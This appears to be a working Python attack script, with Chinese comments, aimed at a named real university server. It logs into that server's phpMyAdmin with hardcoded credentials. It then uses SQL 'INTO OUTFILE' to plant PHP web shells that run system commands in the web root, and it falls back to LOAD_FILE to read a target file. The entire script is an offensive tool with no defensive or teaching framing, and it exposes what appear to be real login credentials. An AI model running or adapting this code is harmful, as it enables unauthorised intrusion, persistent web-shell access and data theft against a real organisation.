#!/usr/bin/env python3
import requests
import re
import time
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

target = "/var/www/html/banpot/scmeeting/x.php"

# 写入一个shell，执行cat命令读取文件
shell_code = '<?php system("cat ' + target + '"); ?>'

# 写入到可访问位置
write_paths = [
    "/var/www/html/banpot/scmeeting/s.php",
    "/var/www/html/banpot/scmeeting/cat.php",
    "/var/www/html/s.php",
]

for write_path in write_paths:
    print(f"[*] 写入shell: {write_path}")
    sql = f"SELECT '{shell_code}' INTO OUTFILE '{write_path}';"
    sql_data = {"sql_query": sql, "db": "scmeeting"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
    
    time.sleep(1)
    
    http_path = write_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    
    if resp2.status_code == 200:
        print(f"[+] 访问成功: {test_url}")
        content = resp2.text
        if '<?php' not in content and len(content) > 10:
            print("=" * 70)
            print(content)
            print("=" * 70)
            exit(0)
        else:
            print(f"响应: {content[:200]}")

# 如果写入失败，尝试通过LOAD_FILE然后SELECT显示
print("[*] 尝试通过SELECT显示LOAD_FILE结果...")
sql = f"SELECT LOAD_FILE('{target}');"
sql_data = {"sql_query": sql, "db": "scmeeting"}
resp = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

# 保存响应
with open('/tmp/load_file_resp.html', 'w', encoding='utf-8', errors='ignore') as f:
    f.write(resp.text)

# 提取所有文本内容
text_content = re.sub(r'<[^>]+>', ' ', resp.text)
text_content = re.sub(r'\s+', ' ', text_content)

# 查找PHP代码片段
php_pattern = r'(&lt;\?php.*?&gt;|&lt;\?.*?&gt;|<\?php.*?\?>)'
php_matches = re.findall(php_pattern, text_content, re.DOTALL | re.IGNORECASE)
if php_matches:
    print("[+] 找到PHP代码:")
    for match in php_matches[:3]:
        match = match.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        print(match[:500])

# 查找包含文件内容的table
table_matches = re.findall(r'<table[^>]*>(.*?)</table>', resp.text, re.DOTALL | re.IGNORECASE)
for table in table_matches:
    rows = re.findall(r'<tr[^>]*>(.*?)</tr>', table, re.DOTALL | re.IGNORECASE)
    for row in rows:
        cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL | re.IGNORECASE)
        for cell in cells:
            cell_text = re.sub(r'<[^>]+>', '', cell).strip()
            cell_text = cell_text.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
            if '<?php' in cell_text or ('system' in cell_text.lower() and len(cell_text) > 20):
                print("[+] 找到文件内容:")
                print("=" * 70)
                print(cell_text)
                print("=" * 70)
                exit(0)

print("[-] 检查响应文件: /tmp/load_file_resp.html")
